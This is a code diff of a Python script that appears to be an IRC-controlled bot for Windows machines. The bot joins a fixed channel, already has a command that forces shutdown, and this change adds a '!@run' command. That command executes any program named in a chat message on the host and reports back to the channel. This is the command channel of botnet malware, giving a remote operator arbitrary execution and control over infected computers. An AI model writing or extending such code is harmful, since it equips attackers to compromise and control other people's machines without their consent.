@@ -152,6 +152,14 @@ def shutdown():
 	"""
 	subprocess.call(["shutdown", "-f", "-s", "-t", "1"])
 
+def run_prog(program):
+	"""
+	Programa que ejecuta un programa en Windows
+	"""
+	print program
+	sub_stdout, sub_stderr = Popen(program, stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
+
+
 #server="192.168.1.30"
 botnick=botName()
 channel="#AbrahamPedro"
@@ -187,7 +195,12 @@ while 1:
 	if msg.lower().find("!@hi")!=-1:
 		irc.send("PRIVMSG "+channel+" :Hello!\r\n")
 	if msg.find("!@run")!=-1:
-		subprocess.call(['C:\\test.txt'])
+		try:
+			program = msg.split(" ")[4]
+			run_prog(program[:-2])
+			irc.send("PRIVMSG "+channel+" :run "+str(program)+"\r\n")
+		except Exception as e:
+			irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
 	if msg.find("!@users")!=-1:
 		users = users()
 		for user in users:
